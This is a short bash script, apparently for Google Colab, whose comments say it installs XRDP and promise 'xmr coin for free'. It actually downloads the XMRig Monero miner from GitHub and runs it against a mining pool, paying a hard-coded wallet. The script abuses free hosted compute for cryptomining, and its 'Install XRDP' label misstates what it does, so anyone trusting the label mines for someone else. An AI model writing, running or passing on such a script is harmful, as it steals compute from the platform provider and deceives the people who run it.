#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 84qxQCbQjL51rdngps7WbKJ7nd9NLFPabFBWWyExzage59Q7UHw1onD7qSwhLYhzB1LtcX7Wx9dyaiU6A25s1Gj3Hy5P9uX -k --tls --rig-id GC-US
